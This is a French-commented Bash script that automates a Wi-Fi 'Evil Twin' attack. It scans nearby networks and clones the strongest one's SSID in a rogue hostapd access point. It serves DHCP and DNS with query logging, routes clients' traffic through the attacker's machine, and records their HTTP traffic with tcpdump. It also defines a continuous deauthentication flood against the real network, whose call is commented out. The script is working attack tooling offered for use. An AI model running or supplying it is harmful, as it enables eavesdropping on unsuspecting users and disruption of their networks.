#!/bin/bash

#############################################
# Variables
#############################################

output_file="datas/data"
output_file_csv="${output_file}-01.csv"

hostapd_conf="/etc/hostapd/hostapd.conf"
dnsmasq_conf="/etc/dnsmasq.conf"

folder_datas="datas"

#############################################
# Fonctions 
#############################################


install_requirements() {
    echo "Vérification des modules requis ..."
    

    if ! command -v tcpdump &> /dev/null; then
        echo "tcpdump n'est pas installé. Installation en cours..."
        apt-get install -y tcpdump
    fi

    if ! command -v aircrack-ng &> /dev/null; then
        echo "aircrack-ng n'est pas installé. Installation en cours..."
        apt-get install -y aircrack-ng
    fi

    if ! command -v hostapd &> /dev/null; then
        echo "hostapd n'est pas installé. Installation en cours..."
        apt-get install -y hostapd
    fi

    if ! command -v dnsmasq &> /dev/null; then
        echo "dnsmasq n'est pas installé. Installation en cours..."
        apt-get install -y dnsmasq
    fi
    
    if ! command -v xterm &> /dev/null; then
        echo "xterm n'est pas installé. Installation en cours..."
        apt-get install -y xterm
    fi


}

start_monitor(){
	echo "Passage de l'interface réseau en mode monitor ..."

	airmon-ng start $interface
}

clear_all(){
	echo "Arrêt du mode monitor en cours ..."
	
	airmon-ng stop $interface_mon 
	
	echo "Redémarrage du DNS local ..."
	systemctl restart systemd-resolved
}

kill_processes(){
	airmon-ng check kill
}

create_folder(){
	if [ ! -d $folder_datas ]; then
		mkdir $folder_datas
	fi
}

start_scan() {
	echo "Scan des réseaux environnants en cours ..."
	
	sudo timeout 5 airodump-ng --write $output_file $interface_mon 
	
} 

select_interface(){
    echo "Recherche de l'interface réseau optimale..."
    
    all_interfaces=$(ip -o link | awk '!/^[0-9]+: lo:/ {print substr($2, 1, length($2)-1)}')
    interface=""
    
    #Si une interface a Mode dans sa description on la selectionne
    for inter in $all_interfaces; do
        if iwconfig $inter | grep -q "Mode:"; then
            interface=$inter
            #interface_mon="${interface}mon"
            interface_mon=$interface
        fi
    done
    
    #Sinon on demande a l'utilisateur de choisir
    if [ -z $interface ]; then
        echo "Veuillez sélectionner une interface :"
        select selected_interface in $all_interfaces; do
            interface=$selected_interface
            #interface_mon="${interface}mon"
            interface_mon=$interface
            break
        done
    fi
    
    echo "Interface sélectionnée : $interface"
}

select_network() {
    # Stocker les valeurs de la colonne 9 (puissance) du fichier CSV dans un tableau
    IFS=$'\n' valeurs_puissance=($(cut -f9 -d"," "$output_file_csv" | awk '!/^$/'))

    # Initialiser les variables pour le réseau le plus proche de zéro
    reseau_plus_proche=""
    valeur_plus_proche=-99999  # Valeur initiale arbitrairement élevée

    # Parcourir les valeurs de puissance
    for valeur_puissance in "${valeurs_puissance[@]}"; do
        if [[ $valeur_puissance != "Power" && $valeur_puissance -ne 0 && $valeur_puissance -ne -1 ]] 2>/dev/null; then
            # Vérifier si la valeur est plus proche de zéro que la valeur précédente
            if [[ $valeur_puissance -gt $valeur_plus_proche ]] 2>/dev/null; then
                valeur_plus_proche=$valeur_puissance
                reseau_plus_proche=$(grep "$valeur_puissance" "$output_file_csv" | cut -f14 -d"," | tr -d ' ')
            fi
        fi
    done

    if [[ $(echo "$reseau_plus_proche" | wc -l) -gt 1 ]]; then
        echo "Veuillez sélectionner le réseau de votre choix :"
        echo "$reseau_plus_proche"
        read -p "Choisissez le numéro du réseau : " choix_reseau
        reseau_plus_proche=$(echo "$reseau_plus_proche" | sed -n "${choix_reseau}p")
    fi

    # une fois qu'on a bien 1 seul SSID
    channel=$(grep "$reseau_plus_proche" "$output_file_csv" | cut -f4 -d"," | tr -d ' ')
    reseau_plus_proche_BSSID=$(grep "$reseau_plus_proche" "$output_file_csv" | cut -f1 -d"," | tr -d ' ')
    echo "Le réseau le plus proche de zéro est : $reseau_plus_proche"
}




configure_hostapd(){
    echo "Configuration du nouveau réseau  ..."
    
    #Création du fichier de conf
    if [ -e "$hostapd_conf" ]; then
    	rm -rf $hostapd_conf
    fi
    
    touch $hostapd_conf

    #Remplissage du hostapd.conf
    echo "interface=$interface" >> $hostapd_conf
    echo "ssid=$reseau_plus_proche" >> $hostapd_conf
    #echo "driver=nl80211" >> $hostapd_conf
    echo "channel=$channel" >> $hostapd_conf
    echo "hw_mode=g" >> $hostapd_conf
    echo "macaddr_acl=0" >> $hostapd_conf
    echo "auth_algs=1" >> $hostapd_conf
    echo "ignore_broadcast_ssid=0" >> $hostapd_conf
    echo "wpa=2" >> $hostapd_conf
    echo "wpa_passphrase=123456789" >> $hostapd_conf
    echo "wpa_key_mgmt=WPA-PSK" >> $hostapd_conf
    echo "wpa_pairwise=TKIP" >> $hostapd_conf
    echo "rsn_pairwise=CCMP" >> $hostapd_conf
}

configure_dnsmasq(){
    echo "Configuration du DNS ..."
    
    #Création du fichier de conf
    if [ -e "$dnsmasq_conf" ]; then
    	rm -rf $dnsmasq_conf
    fi
    
    touch $dnsmasq_conf

    #Remplissage du dnsmasq.conf
    echo "interface=$interface" >> $dnsmasq_conf
    echo "dhcp-range=192.168.1.50,192.168.1.150,12h" >> $dnsmasq_conf
    echo "dhcp-option=3,192.168.1.1" >> $dnsmasq_conf
    echo "dhcp-option=6,192.168.1.1" >> $dnsmasq_conf
    echo "server=8.8.8.8" >> $dnsmasq_conf
    echo "server=8.8.4.4" >> $dnsmasq_conf
    echo "log-queries" >> $dnsmasq_conf
    echo "log-dhcp" >> $dnsmasq_conf
}

configure_routing(){
    echo "Configuration du routage ip ..."

    # Mode routeur du PC
    sudo sysctl net.ipv4.ip_forward=1
    
    # Attribution d'une IP Evil Twin
    #sudo ip addr add 192.168.3.1/24 dev $AP

    #ajout de la gateway a l'interface
    ifconfig $interface 192.168.1.1 netmask 255.255.255.0
    
    #Le but est de retransmettre internet grâce au réseau entrant sur eth0 pour le faire sortir par $interface

    #Nettoyage au préalable de la table systeme
    iptables -t nat -X
    iptables -t nat -F

    #Ajout de la règle dans nat
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

    #Ajout des règles dans table par défaut
    iptables -A FORWARD -i eth0 -o $interface -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i $interface -o eth0 -j ACCEPT
}

run_services(){
    #on tue au préalable le dns local qui tourne sur le port 53
    systemctl stop systemd-resolved
    
    #et aussi le dnsmasq au cas ou il serait encore en running
    pkill dnsmasq
    
    xterm -hold -e "dnsmasq -d" &
    xterm -hold -e "hostapd $hostapd_conf" &
}

ddos_stations(){
    echo "Lancement de l'attaque DDOS sur le réseau cible..."

    aireplay-ng --deauth 0 -a $reseau_plus_proche_BSSID -c $channel $interface_mon
}


sniff_traffic(){
    echo "Sniffing du trafic en cours..."

    #Création du dossier pour enregistrer les paquets capturés
    client_folder="client_${reseau_plus_proche_BSSID}"
    mkdir $client_folder

    #Sniffing des paquets avec tcpdump
    xterm -hold -e "tcpdump -i $interface port 80 -w $client_folder/captured_packets.pcap"
}

display_intro() {
    clear
    intro="
                              .
                          A       ;
                |   ,--,-/ \---,-/|  ,
               _|\,'. /|      /|   \`|-.
           \`.'    /|      ,            \`.;
          ,'\   A     A         A   A _ /| \`.;
        ,/  _              A       _  / _   /|  ;
       /\  / \   ,  ,           A  /    /     \`/|
      /_| | _ \         ,     ,             ,/  \\
     // | |/ \`.\  ,-      ,       ,   ,/ ,/      \\/
     / @| |@  / /'   \\  \\      ,              >  /|    ,--.
    |\\_/   \\_/ /      |  |           ,  ,/        \\  ./' __:..
    |  __ __  |       |  | .--.  ,         >  >   |-'   /     \`
  ,/| /  '  \\ |       |  |     \\      ,           |    /
 /  |<--.__,->|       |  | .    \`.        >  >    /   (
/_,' \\\\  ^  /  \\     /  /   \`.    >--            /^\\   |
      \\\\___/    \\   /  /      \\__'     \\   \\   \\/   \\  |
       \`.   |/          ,  ,                  /\`\\    \\  )
         \\  '  |/    ,       V    \\          /        \`-\\
          \`|/  '  V      V           \\    \\.'            \\_
           '\`-.       V       V        \\./'\\
               \`|/-.      \\ /   \\ /,---\`\\         
                /   \`._____V_____V'
    
    
    Made by Rémy DIONISIO            https://remydionisio.fr
    "
    echo "$intro"
}

main(){
    install_requirements
    create_folder
    select_interface
    kill_processes
    start_monitor
    start_scan 
    select_network
    configure_hostapd
    configure_dnsmasq
    configure_routing
    run_services
    sniff_traffic
    #ddos_stations
    clear_all
}

##################################################
# Corps du programme
##################################################

display_intro

if [ $(id -u) -ne 0 ] 
then	
	echo "Ce script doit être éxécuté en tant que root"
	echo "NOOB"
	exit 1
fi

main
